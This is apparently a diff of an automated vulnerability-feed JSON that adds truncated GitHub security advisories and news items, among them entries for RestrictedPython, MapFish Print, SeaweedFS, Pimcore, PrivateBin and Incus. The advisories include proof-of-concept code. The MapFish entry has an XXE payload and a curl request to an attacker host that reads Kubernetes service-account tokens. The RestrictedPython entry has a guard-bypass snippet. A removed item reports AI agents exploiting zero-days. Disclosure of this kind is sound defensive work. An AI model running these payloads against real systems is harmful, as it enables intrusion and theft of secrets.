@@ -1,8 +1,8 @@
 {
-  "generated": "2026-08-28T17:48:32.501005+00:00",
-  "total": 35,
+  "generated": "2026-08-29T01:15:15.022342+00:00",
+  "total": 57,
   "kev": 0,
-  "zero_day": 18,
+  "zero_day": 19,
   "enriched": 0,
   "findings": [
     {
@@ -31,6 +31,39 @@
         "cloud",
         "threat-intel",
         "research"
+      ],
+      "cve_ids": [],
+      "is_zero_day": true,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-55830",
+      "title": "RestrictedPython guard hooks can be shadowed via positional-only arguments",
+      "summary": "### Impact\n\nRestrictedPython rewrites sensitive operations to go through guard hooks. Attribute access becomes `_getattr_(obj, name)`, item access becomes `_getitem_(obj, key)`, writes go through `_write_`, and print goes through `_print_`. The embedding application supplies these hooks to enforce its policy.\n\nArgument-name validation rejects these protected names for regular arguments, `*args`, `**kwargs`, and keyword-only arguments, but it misses positional-only arguments (the ones before `/`). So a function like:\n\n```python\ndef f(_getattr_=evil, /):\n    return o.x\n```\n\nmakes `_getattr_` a local that shadows the policy hook, and the rewritten access calls `evil` instead. The same works for `_getitem_`, `_write_`, and `_print_`. Shadowing `_print_` can also be used to capture the internal `_getattr_` hook that RestrictedPython passes in.\n\nThe result is that sandboxed code can bypass the access policy the embedding application relies on. In applications that also handle sandbox-controlled objects unsafely (for example serializing them with pickle), this primitive can be chained further, up to remote code execution. That part depends on the embedding application, but the underlying guard bypass is in RestrictedPython.\n\n### Proof of concept\n\nOn an unpatched RestrictedPython this prints `shadowed` and an empty `calls` list, meaning the policy `_getattr_` never ran. With the fix, `compile_restricted` rejects the code.\n\n```python\nfrom RestrictedPython import compile_restricted\nfrom RestrictedPython.Guards import safe_globals, safer_getattr\n\ncalls = []\ndef policy_getattr(obj, name, default=None):\n    calls.append(name)  # the real guard records every access\n    return safer_getattr(obj, name, default)\n\nsrc = \"\"\"\ndef f(o, _getattr_=lambda obj, name: \"shadowed\", /):\n    return o.x\n\"\"\"\n\ncode = compile_restricted(src, \"<s>\", \"exec\")   # currently compiles, should be rejected\ng = dict(safe_globals)\ng[\"_getattr_\"] = policy_getattr\nexec(code, g)\n\nclass O:\n    x = \"secret\"\n\nprint",
+      "link": "https://github.com/advisories/GHSA-ffg3-p8fm-mjx2",
+      "published": "2026-08-28T22:51:35Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-55830"
+      ],
+      "is_zero_day": true,
+      "is_high_severity": true
+    },
+    {
+      "id": "https://www.bleepingcomputer.com/news/security/papercut-releases-second-emergency-patch-for-exploited-flaws/",
+      "title": "PaperCut releases second emergency patch for exploited flaws",
+      "summary": "PaperCut has released a second emergency security update for two actively exploited vulnerabilities in its PaperCut NG and MF print management software after researchers discovered multiple ways to bypass the initial fixes. [...]",
+      "link": "https://www.bleepingcomputer.com/news/security/papercut-releases-second-emergency-patch-for-exploited-flaws/",
+      "published": "2026-08-28T19:08:26+00:00",
+      "source": "Bleeping Computer",
+      "tags": [
+        "news",
+        "malware"
       ],
       "cve_ids": [],
       "is_zero_day": true,
@@ -85,21 +118,6 @@
         "CVE-2026-82078",
         "CVE-2023-27350"
       ],
-      "is_zero_day": true,
-      "is_high_severity": true
-    },
-    {
-      "id": "https://thehackernews.com/2026/08/openai-says-reward-hacking-drove-ai.html",
-      "title": "OpenAI Says Reward Hacking Drove AI Agents to Exploit Zero-Days and Breach Hugging Face",
-      "summary": "OpenAI on Wednesday revealed that reward hacking was a key driver behind the artificial intelligence (AI)-powered hack of Hugging Face last month, adding that it found evidence of misaligned behavior as early as late May.\n\nThe incident, the company said, took place during cybersecurity evaluations of several OpenAI models, and that it was mainly fueled by what it described as a \"highly capable",
-      "link": "https://thehackernews.com/2026/08/openai-says-reward-hacking-drove-ai.html",
-      "published": "2026-08-27T18:36:19+00:00",
-      "source": "The Hacker News Security",
-      "tags": [
-        "news",
-        "zeroday"
-      ],
-      "cve_ids": [],
       "is_zero_day": true,
       "is_high_severity": true
     },
@@ -298,6 +316,384 @@
       "cve_ids": [],
       "is_zero_day": true,
       "is_high_severity": false
+    },
+    {
+      "id": "CVE-2026-55848",
+      "title": "MapFish Print has XXE that allows reading arbitrary files of certain types",
+      "summary": "### Summary\nXXE on MapFish Print allows reading arbitrary files of certain types. Eg /etc/passwd or k8 secrets and certs.\n\nhttps://github.com/mapfish/mapfish-print/commit/13020c0fbc299e5f604e4e66066311c4bf04d507\n\n### Details\nTo trigger the XXE it is required to host a remote script and dtd file. When using the Print feature its possible to send the attacker server url as url of the gml layer.\n\nThe 404 not found path when using the gml Layer will expand the content of the file as path and throw a default 404 with the full content as path.\n\n### PoC\nHost this php file somewhere as xxe.php:\n\n```\n<?php\n$p=$_GET['p'];\n$d=dirname($_SERVER['SCRIPT_NAME']);\n$u=(empty($_SERVER['HTTPS'])?'http':'https').\"://{$_SERVER['HTTP_HOST']}$d/evil.dtd\";\nheader('Content-Type: application/xml');\necho \"<?xml version=\\\"1.0\\\"?>\n<!DOCTYPE x [\n <!ENTITY % payload SYSTEM \\\"file://$p\\\">\n <!ENTITY % dtd SYSTEM \\\"$u\\\">\n %dtd;\n]>\n<wfs:FeatureCollection xmlns:wfs=\\\"http://www.opengis.net/wfs\\\" xmlns:gml=\\\"http://www.opengis.net/gml\\\">\n<!-- \".str_repeat('x',200).\" -->\n<gml:boundedBy><gml:null>unknown</gml:null></gml:boundedBy>\n</wfs:FeatureCollection>\";\n```\n\nand beneath host this \"evil.dtd\"\n\n`<!ENTITY % exfil \"<!ENTITY &#37; error SYSTEM 'file:///xxe-exfil/%payload;'>\">\n%exfil;\n%error;`\n\nNow send a single curl request against your mapfish print server and include your hosted poc url as gml layer url with the path attached you would like to exfil. It will exfil /var/run/secrets/kubernetes.io/serviceaccount/token (most likely your local test setup wont have it, then just replace the path with /etc/passwd or similar plain files)\n\n`curl -sk 'https://mapfish/api/print3/print/mapviewer/buildreport.pdf' \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"layout\":\"1. A4 landscape\",\"attributes\":{\"printDate\":\"a\",\"url\":\"\",\"copyright\":\"\",\"qrimage\":\"\",\"map\":{\"projection\":\"EPSG:2056\",\"rotation\":0,\"dpi\":96,\"center\":[2600000,1200000],\"scale\":100000,\"layers\":[{\"type\":\"gml\",\"url\":\"https://attacker.ch/xxe.php?p=/var/run/",
+      "link": "https://github.com/advisories/GHSA-5v29-34h8-v68r",
+      "published": "2026-08-28T22:33:35Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-55848"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-55874",
+      "title": "SeaweedFS: Path traversal in the S3 gateway X-Amz-Copy-Source header allows cross-bucket object read",
+      "summary": "### Summary\nThe SeaweedFS S3 API gateway did not reject `..` path segments in the `X-Amz-Copy-Source` header used by `CopyObject` and `UploadPartCopy`. The request URL path was hardened against traversal in 4.30 (CVE-2026-54917), but the copy-source header was only checked for emptiness, so a `..` segment in the copy source survived into the server-side filer path and resolved into a different bucket.\n\n### Impact\nA confused-deputy authorization bypass that breaks bucket isolation. IAM evaluates the caller's policy against the bucket named in the request URL (the destination the caller owns), while the copy reads its source from the traversed target bucket. An identity scoped to a single bucket (`Read` + `Write` on one bucket it controls) can therefore read any object in any bucket on the instance and land the result in its own bucket.\n\nFor example, a caller authorized only for `bucket-a` issues a `CopyObject` into `bucket-a` with copy source `bucket-a/../<victim-bucket>/<key>`; the gateway reads `<victim-bucket>/<key>` and writes it to the attacker-controlled destination, from which the caller reads it normally. `UploadPartCopy` (CopyObjectPartHandler) is affected by the same vector.\n\n### Affected versions\nAll releases prior to 4.34. The 4.30 fix for CVE-2026-54917 hardened the request URL path but not the `X-Amz-Copy-Source` header.\n\n### Patched version\n4.34 and later.\n\n### Remediation\nUpgrade to 4.34 or later. The fix validates the copy-source bucket and object key with the same `IsValidBucketName` / `IsValidObjectKey` guards already applied to the request URL, rejecting traversal segments before the handler runs, and applies the same check to `UploadPartCopy`.\n\n### Workaround\nNo configuration workaround. For deployments that cannot upgrade immediately, front the gateway with a reverse proxy that rejects requests whose `X-Amz-Copy-Source` header contains `..`, `%2e%2e`, or backslash sequences.\n\n### References\n- Fix: https://github.com/seaweedfs/seaweedfs/pull/9929",
+      "link": "https://github.com/advisories/GHSA-56wq-x3wv-3ff4",
+      "published": "2026-08-28T22:17:33Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-55874"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-55678",
+      "title": "arc has unauthenticated cluster node admission when `cluster.shared_secret` is unset",
+      "summary": "## Summary\n\nArc Enterprise clustering accepts cluster join requests without authentication when `cluster.enabled=true` but `cluster.shared_secret` is not configured. The coordinator validates HMAC authentication only if a shared secret is non-empty; otherwise, a network attacker who can reach the coordinator port can send a join request with attacker-controlled node addresses and role. Accepted nodes are marked healthy, registered locally or added as Raft voters, and can be selected by the \ncluster router for forwarded authenticated requests.\n\n## Details\n\nCluster defaults include an empty shared secret and TLS disabled:\n\n- `internal/config/config.go:943-950` defaults `cluster.enabled=false`, `cluster.cluster_name=\"arc-cluster\"`, and `cluster.coordinator_addr=\":9100\"`.\n- `internal/config/config.go:1001-1005` defaults `cluster.shared_secret=\"\"` and `cluster.tls_enabled=false`.\n\nStartup requires a shared secret only for file replication, not for all clustering/join/routing use:\n\n- `cmd/arc/main.go:1258-1265` hard-fails without `cluster.shared_secret` only when `cluster.replication_enabled` is true.\n\nThe join request contains attacker-supplied node identity, role, and addresses:\n\n- `internal/cluster/protocol/messages.go:127-142` defines `JoinRequest` fields including `node_id`, `role`, `raft_addr`, `api_addr`, `coord_addr`, plus optional auth fields.\n\nThe coordinator validates HMAC only when the configured shared secret is non-empty:\n\n- `internal/cluster/coordinator.go:1066-1081` wraps all HMAC checks in `if c.cfg.SharedSecret != \"\" { ... }`.\n- If the secret is empty, the join request proceeds after only the cluster-name check.\n\nAn accepted join creates a healthy node from attacker-controlled fields and adds it to cluster trust state:\n\n- `internal/cluster/coordinator.go:1101-1107` creates a node from request fields, sets attacker-provided coordinator/API addresses, and marks it healthy.\n- `internal/cluster/coordinator.go:1108-1129` adds the attacker-provided `raft_addr`",
+      "link": "https://github.com/advisories/GHSA-p378-jp5r-gpgw",
+      "published": "2026-08-28T20:32:57Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-55678"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-55891",
+      "title": "PrivateBin has reflected JSON injection in backend responses via unescaped REQUEST_URI",
+      "summary": "## Vulnerability Details\n\nA reflected JSON injection allows an attacker to return arbitrary data in the JSON endpoints (like ` /?jsonld=` and `/?pasteid`).\n\n### Root Cause\n\n`Request::getRequestUri()` sanitizes `$_SERVER['REQUEST_URI']` with `FILTER_SANITIZE_URL`:\n\n```php\npublic function getRequestUri()\n{\n    $uri = array_key_exists('REQUEST_URI', $_SERVER) ? filter_var($_SERVER['REQUEST_URI'], FILTER_SANITIZE_URL) : '';\n    return empty($uri) ? '/' : $uri;\n}\n```\n\n`FILTER_SANITIZE_URL` does **not** strip `\"`, `'`, `<`, `>` characters (per the PHP manual's allowed-character list for this filter). So the raw, attacker-controlled request URI (including query string) passes through almost unmodified into `Controller::$_urlBase` (set in `_init()`).\n\nIn `Controller::_jsonld()`, `$_urlBase` is spliced directly into one of the static `.jsonld` templates (`js/types.jsonld`, `js/paste.jsonld`, etc.) with a plain `str_replace()`, without any JSON-escaping:\n\n```php\n$content = str_replace(\n    '?jsonld=',\n    $this->_urlBase . '?jsonld=',\n    file_get_contents($file)\n);\n...\nheader('Content-type: application/ld+json');\nheader('Access-Control-Allow-Origin: *');\nheader('Access-Control-Allow-Methods: GET');\necho $content;\n```\n\nA request URI containing a literal `\"` therefore breaks out of the JSON string in the `\"@context\".\"pb\"` value and injects arbitrary attacker-controlled key/value pairs into the response body, which is served with `Content-Type: application/ld+json` and `Access-Control-Allow-Origin: *`.\n\nAdditionally, the `jsonld` case in `Controller::__construct()` returns early:\n\n```php\ncase 'jsonld':\n    $this->_jsonld($this->_request->getParam('jsonld'));\n    return;\n```\n\nThis bypasses `_setCacheHeaders()` and all of the security headers normally applied in `_view()` (notably `X-Content-Type-Options: nosniff`, CSP, `X-Frame-Options`, `Referrer-Policy`). So this is the only response path lacking `X-Content-Type-Options: nosniff`.\n\n### Attack Scenario\n1. An attacker crafts a r",
+      "link": "https://github.com/advisories/GHSA-xrjc-c68j-hp7w",
+      "published": "2026-08-28T20:25:34Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-55891"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-55696",
+      "title": "PrivateBin has stored Cross-Side-Scripting (XSS) vulnerability in attachment download link via dangerous MIME types with required user-interaction",
+      "summary": "### Summary\n\nStored cross-site scripting (XSS) in PrivateBin's attachment download link. An anonymous attacker can create a paste with a **text/html** attachment that, with certain user interaction, bypasses protections similar to CVE-2022-24833. When a victim opens the \"Download attachment\" link in a new tab, the attacker's inline JavaScript executes in the PrivateBin instance's origin with full same-origin capability (cookie/localStorage access, same-origin fetch).\n\nThis is an incomplete fix of [CVE-2022-24833](https://github.com/PrivateBin/PrivateBin/security/advisories/GHSA-cqcc-mm6x-vmvw). The original fix only applies to the inline preview blob (in case of SVG), never to the download link's blob. Thus a **text/html** (or **image/svg**) attachment completely bypasses sanitization, re-enabling the exact attack class on instances that don't enforce the recommended Content-Security-Policy, but with a slightly different attack process.\n\nInstances using the default recommended CSP are protected (the blob inherits **script-src 'self'**, blocking inline scripts). The vulnerability affects instances where CSP is weakened, stripped, or absent, which is exactly the defense-in-depth scenario the CVE-2022-24833 fix was meant to cover.\n\nRequires **fileupload = true** (non-default) and a non-recommended CSP configuration.\n\n### Details\n\nIn **js/privatebin.js**, the function **AttachmentViewer.setAttachment** (line 2982) processes decrypted attachment data. Since PrivateBin uses zero-knowledge encryption, the entire decrypted message (including attachment content and MIME type) is attacker-controlled and can't be inspected or sanitized by the server.\n\n**Root cause 1: MIME-gated sanitization (line 3017)**\n\nDOMPurify sanitization only triggers when the MIME type matches **/^image\\/.\\*svg/i**. Any other active content type (such as **text/html**, **application/xhtml+xml**, **text/xml**) completely bypasses sanitization.\n\n```js\n// js/privatebin.js:3017-3023\nif (mimeType.match(/^im",
+      "link": "https://github.com/advisories/GHSA-f2xf-7x3g-4272",
+      "published": "2026-08-28T20:22:59Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-55696"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-55634",
+      "title": "Pimcore Vulnerable to Remote Code Execution via DataObject Class-Definition Field Name",
+      "summary": "## Overview\n\nA DataObject **class-definition field name** is concatenated, without an identifier allowlist, into the PHP class source that Pimcore generates for every DataObject class (`protected $<fieldName>;`). A user holding only the ordinary `objects` (DataObjects) permission can import a class definition whose field name closes the property and injects arbitrary PHP into the generated class file, achieving remote code execution on the server. The same unvalidated field name is also concatenated into ALTER TABLE DDL (`ADD COLUMN`/`ADD INDEX`), giving a parallel SQL-injection primitive. This is a sibling of CVE-2026-5394 (composite-index column SQL injection); that fix hardened only the `compositeIndices` sink and left the field-name path untouched.\n\n## Impact\n\nAny authenticated user with the `objects` permission \u2014 the standard permission for content editors who work with DataObjects, not an administrator or a dedicated \"classes\" permission \u2014 can:\n\n1. **Execute arbitrary PHP on the server (RCE).** The injected code runs in the web application's PHP process when an object of the affected class is loaded (and is re-executed on every load), with full access to the application, its database credentials, secrets, and the host filesystem/OS \u2014 i.e. full server compromise.\n2. **Execute arbitrary ALTER TABLE DDL (SQL injection)** against the DataObject store/query tables (drop columns, add indexes, corrupt schema).\n**Confidence (read with the Reproduction section).** The RCE sink \u2014 the real builder emitting attacker PHP into the generated class body, that class loading, and its `__construct()` executing a shell command \u2014 is **runtime-confirmed in an isolated harness** (see Reproduction \u2192 \"Lab confirmation\"). The remaining links of the end-to-end chain are **reasoned from source but not yet run end-to-end on a live Pimcore**: (a) the Studio import path (`generateLayoutTreeFromArray` \u2192 `save`) preserving the field name without transform/reject; (b) the persistent-field DDL ",
+      "link": "https://github.com/advisories/GHSA-9x44-4gxf-8c25",
+      "published": "2026-08-28T19:17:42Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-55634"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-55220",
+      "title": "Pimcore Hotspotimage getDataFromResource() unrestricted Serialize::unserialize over object-store column (PHP Object Injection, CWE-502)",
+      "summary": "## Summary\n\n`Pimcore\\Model\\DataObject\\ClassDefinition\\Data\\Hotspotimage::getDataFromResource()` deserializes the `*__hotspots` object-store column through the `Pimcore\\Tool\\Serialize::unserialize()` wrapper **without a class allowlist** (the wrapper's `$allowedClasses` parameter defaults to `true`, i.e. fully unrestricted). Because the persistence layer always stores this column as PHP-`serialize()`d bytes, every load of a DataObject that has a Hotspotimage (advanced image) field runs an unrestricted `unserialize()` over the stored column value. An attacker who can write the `*__hotspots` store column with crafted serialized bytes achieves PHP Object Injection (CWE-502): arbitrary classes are instantiated and their magic methods (`__wakeup`/`__destruct`) execute, which is exploitable for remote code execution via gadget chains present in Pimcore's own bundled dependencies (e.g. `guzzlehttp/guzzle`).\n\nThe same field-data family also affects the sibling marshallers `ImageGallery`, `Block`, and `Video`, which use the identical `json_decode(...) ?: Serialize::unserialize(...)` fallback over their respective store columns. The root cause is shared: `Serialize::unserialize()` defaults to an unrestricted class list, and these callers pass no second argument.\n\n## Severity\n\nHigh. Successful exploitation yields PHP Object Injection leading to remote code execution (proven below as arbitrary file write using a gadget from Pimcore's bundled `guzzlehttp/guzzle 7.11.0`). This is the deserialization leg of an attack: it requires the ability to write the `*__hotspots` object-store column with attacker-chosen serialized bytes. No class-allowlist defense is present, so any such write is directly weaponizable on the next object load. CVSS-wise this is comparable to other deserialization sinks over attacker-influenceable storage in this codebase.\n\n## Affected component\n\n- File: `models/DataObject/ClassDefinition/Data/Hotspotimage.php`, method `getDataFromResource()`.\n- Vulnerable lines",
+      "link": "https://github.com/advisories/GHSA-w23p-wrp7-ch38",
+      "published": "2026-08-28T19:13:25Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-55220"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-55212",
+      "title": "Pimcore: Insufficient Permission Check on Class Definition Creation Endpoint Allows Privilege Escalation",
+      "summary": "### Summary\nThe Studio API class definition creation endpoint in `pimcore/studio-backend-bundle` is guarded by the `objects` permission instead of the `classes` permission, allowing any standard editor-level user to create class definitions without admin privileges. Class definition creation is a structural admin operation that generates new database tables and PHP class files on the server. Additionally, the API layer performs no format validation on the `uid` field before passing it to the model layer, relying solely on model-level validation that exists downstream in `ClassDefinition::saveClassInternal()`.\n\n### Details\n\n### Issue 1 \u2014 Incorrect permission guard on CreateController\n\n`studio-backend-bundle/src/Class/Controller/DefinitionConfiguration/CreateController.php`:\n\n```php\n#[IsGranted(UserPermissions::DATA_OBJECTS->value)]\n```\n\nThe endpoint `POST /pimcore-studio/api/class/definition/configuration-view/detail/create` is protected by `DATA_OBJECTS` (the `objects` permission), which is a standard editor-level permission granted to content editors for creating and editing data objects. Class definition creation is a structural admin operation equivalent to schema modification, it creates new database tables and generates PHP class files on the server. This operation should require the `classes` permission, which is the permission Pimcore enforces for class definition management in the Classic Admin.\n\nAny authenticated user with object editing rights can call this endpoint and create new class definitions, bypassing the intended admin-only restriction. The same user cannot perform this action through the Classic Admin UI, confirming the Studio API enforces a weaker permission check than the existing interface.\n\n**Correct guard:**\n```php\n#[IsGranted(UserPermissions::CLASSES->value)]\n```\n\n### Issue 2 \u2014 No UID format validation at the API layer\n\n`studio-backend-bundle/src/Class/MappedParameter/CreateClassDefinitionParameters.php`:\n\n```php\npublic function __construct",
+      "link": "https://github.com/advisories/GHSA-f97c-ph8j-8vff",
+      "published": "2026-08-28T19:05:25Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-55212"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-55208",
+      "title": "Pimcore: SQL Injection via Column Name in DateFilter allows authenticated user to extract arbitrary database data including admin password hashes",
+      "summary": "## Summary\n\nAn authenticated user extracts the admin password hash and any other database content through a time-based blind SQL injection in the `DateFilter` column key parameter. The `POST /pimcore-studio/api/website-settings` endpoint (and 11 other listing endpoints) accepts a `columnFilters` array where the `key` field is interpolated directly into SQL with only manual backtick wrapping. The `DateFilter` uses fixed named parameters (`:minTime`, `:maxTime`), so the injected column name is not subject to PDO named parameter validation. An attacker breaks out of the backtick quoting with a backtick character and appends arbitrary SQL, including `SLEEP()` for time-based extraction and `IF()` subqueries for conditional data exfiltration.\n\n## Vulnerability Details\n\n### Exploitable: DateFilter with Fixed Named Parameters\n\n`src/Listing/Filter/DateFilter.php` lines 49-57 handle the `on` operator. The column key comes from user input and is placed in the SQL with manual backtick wrapping, while the named parameters are hardcoded as `:minTime` and `:maxTime`:\n\n```php\n$key = $column->getKey();  // user-controlled, no validation\n$dateCondition = '`' . $key . '` ' . ' BETWEEN :minTime AND :maxTime';\n$listing->addConditionParam($dateCondition, ['minTime' => $value, 'maxTime' => ...]);\n```\n\nBecause the named parameters are fixed strings, PDO accepts the binding regardless of what the column name contains.\n\n### Same Pattern in Note FilterService\n\n`src/Note/Service/FilterService.php` lines 64-67:\n\n```php\n$dateCondition = '`' . $filter[$propertyKey] . '` ' . ' BETWEEN :minTime AND :maxTime';\n$list->addConditionParam($dateCondition, ['minTime' => $value, 'maxTime' => $maxTime]);\n```\n\n### No Validation on Column Key\n\n`src/MappedParameter/Filter/ColumnFilter.php` accepts any string as the `key` with zero validation or allowlisting.\n\n### Why Backtick Wrapping is Not Escaping\n\nManual backtick wrapping (`` '`' . $key . '`' ``) does not escape internal backtick characters. `quoteIdentifi",
+      "link": "https://github.com/advisories/GHSA-79cw-hfcc-7mw9",
+      "published": "2026-08-28T19:04:54Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-55208"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-55215",
+      "title": "MariaDB's connector leaks the cleartext password to an MitM despite `ssl: true`",
+      "summary": "### Summary\nWhen SSL/TLS is enabled but no CA / server certificate is provided, the\nconnector verifies the server's identity using fingerprint validation. The\ncheck is effective,  the connection is ultimately rejected when it fails, \nbut it happens *after* the authentication exchange. As a result, the\ncredentials are sent before validation occurs, so an active man-in-the-middle\nwho presents their own certificate receives the password in the handshake\nbefore the connection is aborted.\n\n### Impact\nThe credentials are transmitted to the peer before the server's identity is\nvalidated. An on-path attacker (MitM) presenting any certificate can capture\nthe account password, even though the connection then fails the fingerprint\ncheck and is closed. The disclosed credentials can subsequently be used to\nauthenticate directly against the server.\n\n- Attacker requirement: active man-in-the-middle position on the network path\n- Affected configuration: SSL/TLS enabled without a CA / server certificate\n\n### Affected versions\n- < 3.2.4\n- 3.3.0 \u2013 3.3.2\n- 3.4.0 \u2013 3.4.5\n- 3.5.0 \u2013 3.5.2\n\n### Patches\nFixed in 3.2.4, 3.3.3, 3.4.6, and 3.5.3. Upgrade to one of these (or later)\non your branch.\n\n### Workarounds\nUntil you can upgrade, configure certificate verification explicitly, provide\nthe server/CA certificate and use a verifying SSL mode (e.g. VERIFY_CA /\nVERIFY_FULL). \n\nReported by haaahaaahiihiiii (no GitHub account).",
+      "link": "https://github.com/advisories/GHSA-cqhc-2h57-wpxf",
+      "published": "2026-08-28T19:03:38Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-55215"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-55247",
+      "title": "plone.app.event vulnerable to denial of service via iCalendar import",
+      "summary": "### Impact\nBy abusing the iCalendar import functionality, a logged-in editor could take the whole site offline, make the server reach into the internal network and read calendar files off disk (SSRF), and store XSS.\n\n### Patches\nThe problem has been patched in `plone.app.event`.\n\n* For Plone 6.2: upgrade to `plone.app.event` 6.0.1\n* For Plone 6.1: upgrade to `plone.app.event` 5.2.4\n* For Plone 6.0: upgrade to `plone.app.event` 5.2.4\n\n### Workarounds\nIn the site root, go to the Security tab of the Zope Management Interface (`manage_access`), look for the \"plone.app.event: Import Ical\" permission, and grant this only to the Manager role.  Then only users with the Manager role can use the ical import form.\n\nThere is no workaround for the stored XSS in the URL field of events.\n\nThe vulnerabilities were discovered by Timothy Dudley and responsibly reported to the [Plone Security Team](mailto:security@plone.org). Thank you!",
+      "link": "https://github.com/advisories/GHSA-r82h-mqw3-fc56",
+      "published": "2026-08-28T18:59:42Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-55247"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-55622",
+      "title": "Incus has a project restriction bypass in instance copy across projects",
+      "summary": "### Summary\nMissing authorization checks exist for instance copying where an attacker knowing the name of a project that they don't have access to and the name of an instance in that project can copy the instance to a new project. This issue could allow an attacker to access secrets in instances they are not authorized to access.\n\n### Details\n`cmd/incusd/instances.go` authorizes `POST /1.0/instances` against the target project. In the copy path, `cmd/incusd/instances_post.go` then loads the source instance from `req.Source.Project` without checking whether the caller can view that source instance.\n\nThe copy must occur on the same server. However, once the copy has been done, nothing prevents a malicious actor from moving the instance to another server.\n\n### PoC\n\n#### Setup\n\nAssumes the target server is remotely accessible and a user/certificate has been added.\n\n```\n# create a new project and instance\nincus project create secrets\nincus profile show default | incus --project secrets edit default\nincus --project secrets init images:debian/trixie secret\n\n# restrict an existing certificate to prevent access to the project\nincus config trust edit cert-fp\n#> set, for example\nrestricted: true\nprojects:\n  - default\n\n# verification, with the restricted certificate\nincus ls remote:\n```\n\n#### Exploitation\n\nThe below script was partly generated. To copy the `secret` instance to the `default` project, the following command can be used.\n\n```\npython3 poc.py --url https://IP-REMOTE:8443 \\\n    --cert path/to/client.crt --key path/to/client.key \\\n    --target-project default --source-project secrets \\\n    --source-instance secret --name copy-secret --insecure\n```\n\nWait a bit for the instance to be copied, then `incus ls remote:` to see the copied instance.\n\n```\n#!/usr/bin/env python3\n\"\"\"Copy an instance from a project the caller should not be able to read.\"\"\"\n\nfrom __future__ import annotations\n\nimport argparse\nimport json\nimport ssl\nimport sys\nimport urllib.error\nimport urllib.parse\n",
+      "link": "https://github.com/advisories/GHSA-c9f5-j9c3-mhrg",
+      "published": "2026-08-28T18:57:27Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-55622"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-55621",
+      "title": "Incus has a project restriction bypass for custom volume copy across projects",
+      "summary": "### Summary\n\nMissing authorization checks exist for custom volume copying where an attacker who knows the name of a project that they don't have access to and the name of a custom volume in that project can copy the custom volume to a new project. This issue could allow an attacker to access secrets in custom volumes they are not authorized to access.\n\n### Details\n\nThe storage volume creation handler authorizes creation in the target project, then passes `req.Source.Project` into the custom-volume copy path without checking that the caller can view the source volume. `req.Source.Project` is the attacker-controlled field. It is resolved to a storage volume project name and passed directly to `CreateCustomVolumeFromCopy`. No `allowPermission` or entitlement check (e.g. `CanView` on the source volume) is performed.\n\nThe copy must occur on the same server. However, once the copy has been done, nothing prevents a malicious actor from moving the volume to another server.\n\n### PoC\n#### Setup\n\nAssume the target server is remotely accessible and a user/certificate has been added.\n\n```\n# create a new project and instance\nincus project create secrets\nincus profile show default | incus --project secrets edit default\nincus --project secrets storage volume create default secret-vol\n\n# restrict an existing certificate to prevent access to the project\nincus config trust edit cert-fp\n#> set, for example\nrestricted: true\nprojects:\n  - default\n\n# verification, with the restricted certificate\nincus --project secrets storage volume ls remote:default\n```\n\n#### Exploitation\n\nThe below script was partly generated. To copy the secret instance to the default project, the following command can be used.\n\n```\npython3 poc.py --url https://IP-REMOTE:8443 \\\n    --cert path/to/client.crt --key path/to/client.key \\\n    --target-project default --source-project secrets \\\n    --source-volume secret-vol --name copy-secret-vol \\\n    --pool default --source-pool default \\\n    --insecure\n```\n\nWait a bit f",
+      "link": "https://github.com/advisories/GHSA-64f3-v33m-w89f",
+      "published": "2026-08-28T18:52:05Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-55621"
+      ],
+      "is_zero_day": false,
